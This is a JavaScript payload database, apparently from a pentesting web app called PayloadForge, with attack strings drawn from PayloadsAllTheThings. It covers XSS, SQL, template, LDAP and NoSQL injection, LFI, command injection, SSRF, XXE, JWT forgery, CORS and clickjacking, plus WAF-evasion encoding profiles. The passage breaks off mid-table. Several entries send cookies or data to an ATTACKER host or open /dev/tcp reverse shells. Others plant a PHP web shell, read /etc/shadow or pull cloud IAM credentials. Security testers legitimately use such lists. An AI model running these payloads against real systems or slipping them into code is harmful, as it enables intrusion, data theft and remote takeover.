// ============================================================================
// PayloadForge — payload database, WAF profiles, mutation engine
// Data curated from PayloadsAllTheThings (swisskyrepo, MIT) + PayloadForge (PF).
// Extracted verbatim from the original PayloadForge web app by @Juguitos.
// ============================================================================

const PAYLOADS = {
  "XSS": [
    {id:"xss01",name:"Basic Script Tag",payload:"<script>alert('XSS')<\/script>",tags:["basic","reflected"],source:"PATT"},
    {id:"xss02",name:"IMG onerror",payload:"<img src=x onerror=alert(1)>",tags:["img","dom"],source:"PATT"},
    {id:"xss03",name:"SVG onload",payload:"<svg onload=alert(1)>",tags:["svg","dom"],source:"PATT"},
    {id:"xss04",name:"Details ontoggle",payload:"<details open ontoggle=alert(1)>",tags:["html5","dom"],source:"PATT"},
    {id:"xss05",name:"Input autofocus",payload:"<input autofocus onfocus=alert(1)>",tags:["input","dom"],source:"PATT"},
    {id:"xss06",name:"JS href protocol",payload:'<a href="javascript:alert(1)">XSS</a>',tags:["href","js"],source:"PATT"},
    {id:"xss07",name:"Iframe src JS",payload:'<iframe src="javascript:alert(1)"></iframe>',tags:["iframe","js"],source:"PATT"},
    {id:"xss08",name:"Body onpageshow",payload:"<body onpageshow=alert(1)>",tags:["body"],source:"PATT"},
    {id:"xss09",name:"Video onerror",payload:"<video src=x onerror=alert(1)>",tags:["video","html5"],source:"PATT"},
    {id:"xss10",name:"Eval atob bypass",payload:"<script>eval(atob('YWxlcnQoMSk='))<\/script>",tags:["evasion","base64"],source:"PATT"},
    {id:"xss11",name:"Template string",payload:"<script>alert`1`<\/script>",tags:["template","bypass"],source:"PATT"},
    {id:"xss12",name:"Angular SSTI XSS",payload:"{{constructor.constructor('alert(1)')()}}",tags:["angular","ssti"],source:"PATT"},
    {id:"xss13",name:"Polyglot",payload:"jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/<\\/scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>",tags:["polyglot","advanced"],source:"PATT"},
    {id:"xss14",name:"DOM document.domain",payload:"<img src=1 onerror=alert(document.domain)>",tags:["dom","info-leak"],source:"PATT"},
    {id:"xss15",name:"Cookie stealer",payload:"<script>document.location='http://ATTACKER/?c='+document.cookie<\/script>",tags:["cookie","exfil"],source:"PF"},
    {id:"xss16",name:"Object data JS",payload:'<object data="javascript:alert(1)">',tags:["object","bypass"],source:"PATT"},
    {id:"xss17",name:"onmouseover",payload:"<div onmouseover=alert(1)>hover</div>",tags:["event","dom"],source:"PATT"},
    {id:"xss18",name:"srcdoc iframe",payload:'<iframe srcdoc="<script>alert(1)<\\/script>">',tags:["iframe","srcdoc"],source:"PATT"},
    {id:"xss19",name:"Form action JS",payload:'<form action="javascript:alert(1)"><input type=submit>',tags:["form","js"],source:"PATT"},
    {id:"xss20",name:"Char code eval",payload:"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))<\/script>",tags:["charcode","evasion"],source:"PF"},
  ],
  "SQLi": [
    {id:"sq01",name:"Classic OR bypass",payload:"' OR '1'='1",tags:["auth-bypass","basic"],source:"PATT"},
    {id:"sq02",name:"Comment bypass (--)",payload:"admin'--",tags:["auth-bypass","comment"],source:"PATT"},
    {id:"sq03",name:"Hash comment MySQL",payload:"admin'#",tags:["auth-bypass","mysql"],source:"PATT"},
    {id:"sq04",name:"UNION 2 cols NULL",payload:"' UNION SELECT NULL,NULL--",tags:["union","enum"],source:"PATT"},
    {id:"sq05",name:"UNION @@version MySQL",payload:"' UNION SELECT @@version,NULL--",tags:["union","mysql","enum"],source:"PATT"},
    {id:"sq06",name:"UNION @@version MSSQL",payload:"' UNION SELECT @@version,NULL,NULL--",tags:["union","mssql","enum"],source:"PATT"},
    {id:"sq07",name:"Dump table names",payload:"' UNION SELECT table_name,NULL FROM information_schema.tables--",tags:["union","mysql","schema"],source:"PATT"},
    {id:"sq08",name:"MSSQL WAITFOR (time)",payload:"'; WAITFOR DELAY '0:0:5'--",tags:["blind","time","mssql"],source:"PATT"},
    {id:"sq09",name:"MySQL SLEEP (time)",payload:"' AND SLEEP(5)--",tags:["blind","time","mysql"],source:"PATT"},
    {id:"sq10",name:"PostgreSQL pg_sleep",payload:"'; SELECT pg_sleep(5)--",tags:["blind","time","pgsql"],source:"PATT"},
    {id:"sq11",name:"Boolean TRUE",payload:"' AND 1=1--",tags:["blind","boolean"],source:"PATT"},
    {id:"sq12",name:"Boolean FALSE",payload:"' AND 1=2--",tags:["blind","boolean"],source:"PATT"},
    {id:"sq13",name:"Error ExtractValue",payload:"' AND EXTRACTVALUE(1,CONCAT(0x7e,@@version))--",tags:["error-based","mysql"],source:"PATT"},
    {id:"sq14",name:"Stacked DROP TABLE",payload:"'; DROP TABLE users--",tags:["stacked","destructive"],source:"PATT"},
    {id:"sq15",name:"MySQL INTO OUTFILE",payload:"' UNION SELECT '<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/var/www/html/sh.php'--",tags:["file-write","rce","mysql"],source:"PATT"},
    {id:"sq16",name:"ORDER BY column enum",payload:"' ORDER BY 1--",tags:["enum","columns"],source:"PATT"},
    {id:"sq17",name:"UNION user/password",payload:"' UNION SELECT username,password FROM users--",tags:["union","creds"],source:"PATT"},
    {id:"sq18",name:"Substring blind extract",payload:"' AND SUBSTRING(username,1,1)='a'--",tags:["blind","boolean","extract"],source:"PATT"},
    {id:"sq19",name:"Load_File read",payload:"' UNION SELECT LOAD_FILE('/etc/passwd'),NULL--",tags:["file-read","mysql"],source:"PATT"},
    {id:"sq20",name:"XML UpdateXML error",payload:"' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version())),1)--",tags:["error-based","mysql"],source:"PATT"},
  ],
  "SSTI": [
    {id:"st01",name:"Jinja2 Math detect",payload:"{{7*7}}",tags:["jinja2","detect"],source:"PATT"},
    {id:"st02",name:"Jinja2 String*Int",payload:"{{7*'7'}}",tags:["jinja2","detect"],source:"PATT"},
    {id:"st03",name:"Jinja2 Config dump",payload:"{{config}}",tags:["jinja2","info-leak"],source:"PATT"},
    {id:"st04",name:"Jinja2 Config items",payload:"{{config.items()}}",tags:["jinja2","info-leak"],source:"PATT"},
    {id:"st05",name:"Jinja2 RCE subprocess",payload:"{{''.__class__.__mro__[1].__subclasses__()[401]('id',shell=True,stdout=-1).communicate()[0].strip()}}",tags:["jinja2","rce","advanced"],source:"PATT"},
    {id:"st06",name:"Jinja2 lipsum RCE",payload:"{{lipsum.__globals__['os'].popen('id').read()}}",tags:["jinja2","rce"],source:"PATT"},
    {id:"st07",name:"Twig detect",payload:"{{7*'7'}}",tags:["twig","detect"],source:"PATT"},
    {id:"st08",name:"Twig RCE filter",payload:"{{'id'|filter('system')}}",tags:["twig","rce"],source:"PATT"},
    {id:"st09",name:"Freemarker detect",payload:"${7*7}",tags:["freemarker","detect"],source:"PATT"},
    {id:"st10",name:"Freemarker RCE",payload:'<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',tags:["freemarker","rce"],source:"PATT"},
    {id:"st11",name:"Smarty detect",payload:"{$smarty.version}",tags:["smarty","detect"],source:"PATT"},
    {id:"st12",name:"Smarty RCE",payload:"{system('id')}",tags:["smarty","rce"],source:"PATT"},
    {id:"st13",name:"ERB Ruby detect",payload:"<%= 7*7 %>",tags:["erb","ruby","detect"],source:"PATT"},
    {id:"st14",name:"ERB Ruby RCE",payload:"<%= `id` %>",tags:["erb","ruby","rce"],source:"PATT"},
    {id:"st15",name:"Tornado detect",payload:"{{7*7}}",tags:["tornado","detect"],source:"PATT"},
    {id:"st16",name:"Tornado RCE import os",payload:"{% import os %}{{os.popen('id').read()}}",tags:["tornado","rce"],source:"PATT"},
    {id:"st17",name:"Velocity detect",payload:"#set($x=7*7)${x}",tags:["velocity","detect"],source:"PATT"},
    {id:"st18",name:"Mako RCE",payload:"${__import__('os').popen('id').read()}",tags:["mako","python","rce"],source:"PATT"},
  ],
  "LFI": [
    {id:"lf01",name:"Basic /etc/passwd",payload:"../../../etc/passwd",tags:["linux","basic"],source:"PATT"},
    {id:"lf02",name:"Deep traversal",payload:"../../../../../../../../etc/passwd",tags:["linux","deep"],source:"PATT"},
    {id:"lf03",name:"Null Byte bypass",payload:"../../../etc/passwd%00",tags:["null-byte","bypass"],source:"PATT"},
    {id:"lf04",name:"Double URL encode",payload:"..%252f..%252f..%252fetc%252fpasswd",tags:["double-encode","bypass"],source:"PATT"},
    {id:"lf05",name:"Path normalize bypass",payload:"....//....//....//etc/passwd",tags:["normalization","bypass"],source:"PATT"},
    {id:"lf06",name:"PHP filter base64",payload:"php://filter/convert.base64-encode/resource=index.php",tags:["php","wrapper","source"],source:"PATT"},
    {id:"lf07",name:"PHP filter rot13",payload:"php://filter/read=string.rot13/resource=index.php",tags:["php","wrapper","bypass"],source:"PATT"},
    {id:"lf08",name:"PHP input RCE",payload:"php://input [POST: <?php system('id');?>]",tags:["php","rce","input"],source:"PATT"},
    {id:"lf09",name:"Data URI RCE",payload:"data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",tags:["php","rce","data-uri"],source:"PATT"},
    {id:"lf10",name:"Proc self environ",payload:"../../../proc/self/environ",tags:["linux","log-poison"],source:"PATT"},
    {id:"lf11",name:"Proc self cmdline",payload:"../../../proc/self/cmdline",tags:["linux","info-leak"],source:"PATT"},
    {id:"lf12",name:"Windows win.ini",payload:"..\\..\\..\\windows\\win.ini",tags:["windows","basic"],source:"PATT"},
    {id:"lf13",name:"Windows hosts file",payload:"../../../../windows/system32/drivers/etc/hosts",tags:["windows","hosts"],source:"PATT"},
    {id:"lf14",name:"Apache access.log",payload:"../../../var/log/apache2/access.log",tags:["log-poison","apache"],source:"PATT"},
    {id:"lf15",name:"SSH auth.log",payload:"../../../var/log/auth.log",tags:["log-poison","ssh"],source:"PATT"},
    {id:"lf16",name:"Zip wrapper RCE",payload:"zip://path/to/upload.zip#shell.php",tags:["php","wrapper","zip"],source:"PATT"},
    {id:"lf17",name:"phar wrapper",payload:"phar://./uploads/evil.phar/shell.php",tags:["php","phar","rce"],source:"PF"},
    {id:"lf18",name:"/etc/shadow",payload:"../../../etc/shadow",tags:["linux","creds"],source:"PF"},
  ],
  "IDOR": [
    {id:"id01",name:"Sequential numeric ID",payload:"/api/users/1",tags:["horizontal","basic"],source:"PATT"},
    {id:"id02",name:"Zero index",payload:"/api/users/0",tags:["horizontal","zero"],source:"PATT"},
    {id:"id03",name:"Negative ID",payload:"/api/users/-1",tags:["horizontal","negative"],source:"PATT"},
    {id:"id04",name:"UUID v4 sequential",payload:"/api/orders/00000000-0000-0000-0000-000000000001",tags:["uuid","enum"],source:"PATT"},
    {id:"id05",name:"Base64 encoded ID",payload:"/api/profile/dXNlcklkPTEyMw==",tags:["base64","obfuscated"],source:"PATT"},
    {id:"id06",name:"MD5 hashed ID",payload:"/api/user/c4ca4238a0b923820dcc509a6f75849b",tags:["md5","obfuscated"],source:"PATT"},
    {id:"id07",name:"HTTP param pollution",payload:"/api/account?id=1&id=2",tags:["param-pollution","bypass"],source:"PATT"},
    {id:"id08",name:"Mass assignment JSON",payload:'{"id":1,"role":"admin","isAdmin":true}',tags:["mass-assign","priv-esc"],source:"PATT"},
    {id:"id09",name:"GUID v1 brute",payload:"/api/invoice/00000000-0000-1000-8000-000000000001",tags:["guid","v1","brute"],source:"PF"},
    {id:"id10",name:"Path traversal via IDOR",payload:"/api/files/../../etc/passwd",tags:["lfi","combined"],source:"PATT"},
    {id:"id11",name:"GraphQL IDOR query",payload:'query { user(id: "1") { email password } }',tags:["graphql","enum"],source:"PATT"},
    {id:"id12",name:"S3 bucket direct",payload:"https://BUCKET.s3.amazonaws.com/private/user_1/data.csv",tags:["s3","aws","cloud"],source:"PATT"},
    {id:"id13",name:"Referer header bypass",payload:"Referer: /admin/users/1/edit",tags:["header","bypass"],source:"PATT"},
    {id:"id14",name:"JSON horizontal priv",payload:'{"userId":"victim_id","action":"delete"}',tags:["json","horizontal"],source:"PATT"},
    {id:"id15",name:"Wildcard object ref",payload:"/api/users/*",tags:["wildcard","enum"],source:"PF"},
    {id:"id16",name:"Account takeover token",payload:"/api/reset?token=0000000000000000&user=victim@email.com",tags:["account-takeover","token"],source:"PF"},
  ],
  "CmdInj": [
    {id:"ci01",name:"Semicolon chain",payload:"127.0.0.1; id",tags:["basic","linux"],source:"PATT"},
    {id:"ci02",name:"Pipe chain",payload:"127.0.0.1 | id",tags:["pipe","linux"],source:"PATT"},
    {id:"ci03",name:"Double pipe OR",payload:"127.0.0.1 || id",tags:["or","linux"],source:"PATT"},
    {id:"ci04",name:"Backtick RCE",payload:"`id`",tags:["backtick","linux"],source:"PATT"},
    {id:"ci05",name:"Subshell $()",payload:"$(id)",tags:["subshell","linux"],source:"PATT"},
    {id:"ci06",name:"Newline bypass",payload:"127.0.0.1%0aid",tags:["newline","bypass"],source:"PATT"},
    {id:"ci07",name:"IFS bypass",payload:"cat${IFS}/etc/passwd",tags:["IFS","spaces","bypass"],source:"PATT"},
    {id:"ci08",name:"Base64 rev shell",payload:"echo 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'|base64|bash",tags:["reverse-shell","b64"],source:"PF"},
    {id:"ci09",name:"Windows & chain",payload:"127.0.0.1 & whoami",tags:["windows","basic"],source:"PATT"},
    {id:"ci10",name:"Windows | chain",payload:"127.0.0.1 | whoami",tags:["windows","pipe"],source:"PATT"},
    {id:"ci11",name:"PowerShell exec",payload:"; powershell -c whoami",tags:["windows","powershell"],source:"PATT"},
    {id:"ci12",name:"Out-of-band curl",payload:"127.0.0.1; curl http://ATTACKER/?x=$(whoami)",tags:["oob","exfil"],source:"PF"},
    {id:"ci13",name:"Time-based blind",payload:"; sleep 5",tags:["blind","time"],source:"PATT"},
    {id:"ci14",name:"Glob bypass",payload:"/???/??t /etc/passwd",tags:["glob","bypass"],source:"PATT"},
    {id:"ci15",name:"Hex encoding bypass",payload:'$(printf "\\x69\\x64")',tags:["hex","bypass"],source:"PATT"},
    {id:"ci16",name:"Read /etc/passwd",payload:"; cat /etc/passwd",tags:["linux","exfil"],source:"PF"},
  ],
  "CORS": [
    {id:"co01",name:"Origin reflection test",payload:"Origin: https://evil.com",tags:["header","basic"],source:"PATT"},
    {id:"co02",name:"Null origin",payload:"Origin: null",tags:["null","bypass"],source:"PATT"},
    {id:"co03",name:"Subdomain prefix attack",payload:"Origin: https://evil.TARGET.com",tags:["subdomain","bypass"],source:"PATT"},
    {id:"co04",name:"Subdomain suffix attack",payload:"Origin: https://TARGET.com.evil.com",tags:["suffix","bypass"],source:"PATT"},
    {id:"co05",name:"HTTP downgrade",payload:"Origin: http://TARGET.com",tags:["http","downgrade"],source:"PATT"},
    {id:"co06",name:"CORS PoC fetch",payload:"fetch('https://TARGET.com/api/secret',{credentials:'include'}).then(r=>r.text()).then(d=>fetch('http://ATTACKER/?x='+btoa(d)))",tags:["poc","js","exfil"],source:"PF"},
    {id:"co07",name:"XHR with credentials",payload:"var x=new XMLHttpRequest();x.open('GET','https://TARGET.com/api/private',true);x.withCredentials=true;x.onload=()=>fetch('http://ATTACKER/?d='+btoa(x.responseText));x.send();",tags:["xhr","credentials"],source:"PF"},
    {id:"co08",name:"Wildcard check",payload:"Origin: https://anything.com",tags:["wildcard","detect"],source:"PF"},
    {id:"co09",name:"localhost origin",payload:"Origin: http://localhost",tags:["localhost","internal"],source:"PATT"},
    {id:"co10",name:"CORS + CSRF exfil",payload:"<script>fetch('https://TARGET.com/api/user',{credentials:'include'}).then(r=>r.json()).then(d=>document.location='http://ATTACKER/?j='+JSON.stringify(d))<\/script>",tags:["csrf","exfil"],source:"PF"},
    {id:"co11",name:"Pre-flight OPTIONS test",payload:"OPTIONS /api/data HTTP/1.1\r\nOrigin: https://evil.com\r\nAccess-Control-Request-Method: DELETE",tags:["preflight","options"],source:"PATT"},
    {id:"co12",name:"Trusted subdomain XSS",payload:"Origin: https://xss.subdomain.TARGET.com",tags:["xss","subdomain"],source:"PF"},
  ],
  "JWT": [
    {id:"jw01",name:"alg:none attack",payload:'{"alg":"none","typ":"JWT"}',tags:["alg-none","critical"],source:"PATT"},
    {id:"jw02",name:"alg:None (capital N)",payload:'{"alg":"None","typ":"JWT"}',tags:["alg-none","bypass"],source:"PATT"},
    {id:"jw03",name:"Admin role escalation",payload:'{"sub":"user","role":"admin","iat":1700000000}',tags:["priv-esc","claims"],source:"PF"},
    {id:"jw04",name:"Remove expiry",payload:'{"sub":"user","exp":9999999999,"iat":1700000000}',tags:["exp","bypass"],source:"PF"},
    {id:"jw05",name:"kid path traversal",payload:'{"alg":"HS256","kid":"../../dev/null"}',tags:["kid","lfi","critical"],source:"PATT"},
    {id:"jw06",name:"kid SQL injection",payload:"{'alg':'HS256','kid':\"x' UNION SELECT 'secret'-- -\"}",tags:["kid","sqli"],source:"PATT"},
    {id:"jw07",name:"jku header injection",payload:'{"alg":"RS256","jku":"https://ATTACKER/jwks.json"}',tags:["jku","ssrf"],source:"PATT"},
    {id:"jw08",name:"x5u header injection",payload:'{"alg":"RS256","x5u":"https://ATTACKER/cert.pem"}',tags:["x5u","ssrf"],source:"PATT"},
    {id:"jw09",name:"isAdmin claim inject",payload:'{"sub":"user","isAdmin":true,"userId":1}',tags:["claims","priv-esc"],source:"PF"},
    {id:"jw10",name:"Blank signature (none)",payload:"eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",tags:["alg-none","pre-built"],source:"PF"},
    {id:"jw11",name:"Embedded JWK self-sign",payload:'{"alg":"RS256","jwk":{"kty":"RSA","n":"ATTACKER_N","e":"AQAB"}}',tags:["jwk","critical"],source:"PATT"},
    {id:"jw12",name:"HS256 weak secret brute",payload:"hashcat -a 0 -m 16500 token.jwt wordlist.txt",tags:["brute","weak-secret"],source:"PF"},
  ],
  "LDAP": [
    {id:"ld01",name:"Auth bypass (*)",payload:"*)(&",tags:["auth-bypass","basic"],source:"PATT"},
    {id:"ld02",name:"Always true inject",payload:"*)(uid=*))(|(uid=*",tags:["always-true","bypass"],source:"PATT"},
    {id:"ld03",name:"Admin login bypass",payload:"admin)(&(password=*))",tags:["auth-bypass","admin"],source:"PATT"},
    {id:"ld04",name:"Wildcard inject",payload:"*",tags:["wildcard","enum"],source:"PATT"},
    {id:"ld05",name:"OR injection",payload:"admin)(|(password=*))",tags:["or","enum"],source:"PATT"},
    {id:"ld06",name:"Blind attr extraction",payload:"admin)(|(description=a*))",tags:["blind","extract"],source:"PATT"},
    {id:"ld07",name:"DN inject",payload:"cn=admin,dc=example,dc=com)(|(cn=*",tags:["dn","advanced"],source:"PATT"},
    {id:"ld08",name:"userPassword dump",payload:"*)(|(userPassword=*))",tags:["creds","dump"],source:"PF"},
    {id:"ld09",name:"Mail attr dump",payload:"*)(mail=*",tags:["mail","enum"],source:"PF"},
    {id:"ld10",name:"Filter escape",payload:"\\2a)(uid=*))(|(uid=\\2a",tags:["escape","bypass"],source:"PATT"},
    {id:"ld11",name:"Null byte bypass",payload:"admin\\00",tags:["null-byte","bypass"],source:"PATT"},
    {id:"ld12",name:"Password hint extract",payload:"admin)(|(pwdHint=*))",tags:["password","hint"],source:"PF"},
  ],
  "NoSQL": [
    {id:"ns01",name:"MongoDB auth bypass",payload:'{"username":{"$gt":""},"password":{"$gt":""}}',tags:["mongodb","auth-bypass"],source:"PATT"},
    {id:"ns02",name:"$ne operator bypass",payload:'{"username":"admin","password":{"$ne":"invalid"}}',tags:["ne","bypass"],source:"PATT"},
    {id:"ns03",name:"$regex login bypass",payload:'{"username":{"$regex":"admin"},"password":{"$regex":".*"}}',tags:["regex","bypass"],source:"PATT"},
    {id:"ns04",name:"URL param injection",payload:"?username[$ne]=invalid&password[$ne]=invalid",tags:["url","param"],source:"PATT"},
    {id:"ns05",name:"$where JS injection",payload:'{"$where":"this.username==\'admin\'&&this.password.match(/.*/)>0"}',tags:["where","js"],source:"PATT"},
    {id:"ns06",name:"$in array bypass",payload:'{"username":{"$in":["admin","root"]},"password":{"$ne":""}}',tags:["in","enum"],source:"PATT"},
    {id:"ns07",name:"Blind extract $regex",payload:'{"username":"admin","password":{"$regex":"^a"}}',tags:["blind","regex","extract"],source:"PATT"},
    {id:"ns08",name:"$exists dump",payload:'{"username":{"$exists":true},"password":{"$exists":true}}',tags:["exists","dump"],source:"PATT"},
    {id:"ns09",name:"Redis KEYS dump",payload:"KEYS *",tags:["redis","dump"],source:"PATT"},
    {id:"ns10",name:"CouchDB all_docs",payload:"/_all_docs?include_docs=true",tags:["couchdb","dump"],source:"PATT"},
    {id:"ns11",name:"GraphQL NoSQL inject",payload:'{ user(username: {"$regex": ".*"}) { id email password } }',tags:["graphql","nosql"],source:"PF"},
    {id:"ns12",name:"Mongoose type cast",payload:'{"username":"admin","password":{"$gt":0}}',tags:["mongoose","typecast"],source:"PF"},
  ],
  "SSI": [
    {id:"si01",name:"Exec cmd (Linux)",payload:'<!--#exec cmd="id" -->',tags:["exec","linux","rce"],source:"PATT"},
    {id:"si02",name:"Exec cmd (Windows)",payload:'<!--#exec cmd="whoami" -->',tags:["exec","windows","rce"],source:"PATT"},
    {id:"si03",name:'Include /etc/passwd',payload:'<!--#include virtual="/etc/passwd" -->',tags:["include","lfi"],source:"PATT"},
    {id:"si04",name:"Include /etc/shadow",payload:'<!--#include file="/etc/shadow" -->',tags:["include","creds"],source:"PATT"},
    {id:"si05",name:"Print env vars",payload:"<!--#printenv -->",tags:["env","info-leak"],source:"PATT"},
    {id:"si06",name:"Echo DATE",payload:'<!--#echo var="DATE_LOCAL" -->',tags:["echo","detect"],source:"PATT"},
    {id:"si07",name:"Echo DOCUMENT_NAME",payload:'<!--#echo var="DOCUMENT_NAME" -->',tags:["echo","info-leak"],source:"PATT"},
    {id:"si08",name:"Exec /bin/cat",payload:'<!--#exec cmd="/bin/cat /etc/passwd" -->',tags:["exec","exfil"],source:"PATT"},
    {id:"si09",name:"Set variable detect",payload:'<!--#set var="test" value="1" --><!--#echo var="test" -->',tags:["set","detect"],source:"PATT"},
    {id:"si10",name:"Reverse shell via exec",payload:'<!--#exec cmd="bash -i >& /dev/tcp/ATTACKER/4444 0>&1" -->',tags:["revshell","exec"],source:"PF"},
    {id:"si11",name:"fsize info leak",payload:'<!--#fsize file="/etc/passwd" -->',tags:["fsize","info-leak"],source:"PATT"},
    {id:"si12",name:"Include CGI RCE",payload:'<!--#include virtual="/cgi-bin/shell.cgi?cmd=id" -->',tags:["cgi","rce"],source:"PATT"},
  ],
  "SSRF": [
    {id:"ss01",name:"Localhost HTTP",payload:"http://localhost/admin",tags:["localhost","basic"],source:"PATT"},
    {id:"ss02",name:"127.0.0.1",payload:"http://127.0.0.1/admin",tags:["loopback","basic"],source:"PATT"},
    {id:"ss03",name:"0.0.0.0",payload:"http://0.0.0.0:80/admin",tags:["loopback","bypass"],source:"PATT"},
    {id:"ss04",name:"AWS metadata v1",payload:"http://169.254.169.254/latest/meta-data/",tags:["aws","metadata","cloud"],source:"PATT"},
    {id:"ss05",name:"AWS IAM credentials",payload:"http://169.254.169.254/latest/meta-data/iam/security-credentials/",tags:["aws","iam","creds"],source:"PATT"},
    {id:"ss06",name:"GCP metadata",payload:"http://metadata.google.internal/computeMetadata/v1/",tags:["gcp","metadata","cloud"],source:"PATT"},
    {id:"ss07",name:"Azure metadata",payload:"http://169.254.169.254/metadata/instance?api-version=2021-02-01",tags:["azure","cloud"],source:"PATT"},
    {id:"ss08",name:"File protocol",payload:"file:///etc/passwd",tags:["file","lfi"],source:"PATT"},
    {id:"ss09",name:"Dict port scan",payload:"dict://127.0.0.1:22/INFO",tags:["dict","portscan"],source:"PATT"},
    {id:"ss10",name:"Gopher Redis",payload:"gopher://127.0.0.1:6379/_INFO",tags:["gopher","redis"],source:"PATT"},
    {id:"ss11",name:"IPv6 loopback",payload:"http://[::1]/admin",tags:["ipv6","bypass"],source:"PATT"},
    {id:"ss12",name:"Decimal IP bypass",payload:"http://2130706433/admin",tags:["decimal","bypass"],source:"PATT"},
    {id:"ss13",name:"Hex encoded IP",payload:"http://0x7f000001/admin",tags:["hex","bypass"],source:"PATT"},
    {id:"ss14",name:"Internal network scan",payload:"http://192.168.1.1/",tags:["internal","scan"],source:"PF"},
    {id:"ss15",name:"DNS rebinding",payload:"http://ATTACKER.com (resolves to 127.0.0.1 after first req)",tags:["dns-rebinding","bypass"],source:"PATT"},
    {id:"ss16",name:"Open redirect chain",payload:"https://trusted.com/redirect?url=http://169.254.169.254/",tags:["redirect","bypass"],source:"PATT"},
  ],
  "XXE": [
    {id:"xx01",name:"Basic /etc/passwd read",payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',tags:["basic","file-read"],source:"PATT"},
    {id:"xx02",name:"/etc/shadow read",payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><foo>&xxe;</foo>',tags:["creds","file-read"],source:"PATT"},
    {id:"xx03",name:"SSRF via XXE",payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',tags:["ssrf","aws"],source:"PATT"},
    {id:"xx04",name:"Blind OOB exfil",payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER/evil.dtd"> %xxe;]><foo>test</foo>',tags:["blind","oob"],source:"PATT"},
    {id:"xx05",name:"PHP filter source read",payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><foo>&xxe;</foo>',tags:["php","source"],source:"PATT"},
    {id:"xx06",name:"Windows system.ini read",payload:'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system.ini">]><foo>&xxe;</foo>',tags:["windows","file-read"],source:"PATT"},
    {id:"xx07",name:"Billion laughs DoS",payload:'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>',tags:["dos","billion-laughs"],source:"PATT"},
    {id:"xx08",name:"SVG XXE upload",payload:'<svg xmlns="http://www.w3.org/2000/svg"><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><text>&xxe;</text></svg>',tags:["svg","upload"],source:"PATT"},
    {id:"xx09",name:"XInclude attack",payload:'<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',tags:["xinclude","bypass"],source:"PATT"},
    {id:"xx10",name:"Parameter entity blind",payload:"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>\"> %eval; %exfil;]>",tags:["param","blind","oob"],source:"PATT"},
    {id:"xx11",name:"XXE via JSON CT spoof",payload:"Set Content-Type: application/xml then send XXE payload",tags:["json","content-type"],source:"PATT"},
    {id:"xx12",name:"XLSX XXE",payload:"[Content_Types].xml: <?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",tags:["xlsx","office"],source:"PATT"},
  ],
  "Clickjacking": [
    {id:"cj01",name:"Basic iframe embed",payload:'<iframe src="https://TARGET.com" width="800" height="600"></iframe>',tags:["basic","iframe"],source:"PF"},
    {id:"cj02",name:"Transparent overlay PoC",payload:'<style>iframe{opacity:0.01;position:absolute;top:0;left:0;width:100%;height:100%}</style><iframe src="https://TARGET.com"></iframe><button style="position:absolute;top:200px;left:200px">CLICK ME</button>',tags:["transparent","ui-redress"],source:"PF"},
    {id:"cj03",name:"Form hijack PoC",payload:"<style>body{margin:0}#v{position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;z-index:999}</style><iframe id='v' src='https://TARGET.com/delete-account'></iframe>",tags:["form","hijack"],source:"PF"},
    {id:"cj04",name:"Detect missing header",payload:"curl -I https://TARGET.com | grep -i x-frame",tags:["detect","headers"],source:"PF"},
    {id:"cj05",name:"CSP frame-ancestors fix",payload:"Content-Security-Policy: frame-ancestors 'none'",tags:["csp","mitigation"],source:"PF"},
    {id:"cj06",name:"Drag & drop exfil",payload:'<style>iframe{position:absolute;width:400px;height:400px;opacity:0}</style><iframe src="https://TARGET.com/drafts"></iframe>',tags:["drag-drop","exfil"],source:"PATT"},
    {id:"cj07",name:"Double frame bypass",payload:'<iframe><iframe src="https://TARGET.com"></iframe></iframe>',tags:["double-frame","bypass"],source:"PATT"},
    {id:"cj08",name:"X-Frame-Options DENY",payload:"X-Frame-Options: DENY",tags:["mitigation","header"],source:"PF"},
  ],
};

const WAF_PROFILES = {
  'Cloudflare':  ['url_encode','case_alternation','html_entity','unicode_escape'],
  'ModSecurity': ['double_url_encode','null_byte','sql_comment','hex_encode'],
  'AWS WAF':     ['base64','html_entity','tab_substitute','newline_inject'],
  'Akamai':      ['unicode_escape','double_url_encode','case_alternation','null_byte'],
  'F5 BIG-IP':   ['hex_encode','html_entity','tab_substitute','url_encode'],
  'Imperva':     ['double_url_encode','html_hex','case_alternation','tab_substitute'],
  'Generic':     ['url_encode','base64','html_entity','hex_encode'],
};

const MUTATION_LABELS = {
  url_encode:        'URL Encode',
  double_url_encode: 'Double URL Encode',
  html_entity:       'HTML Entity',
  base64:            'Base64',
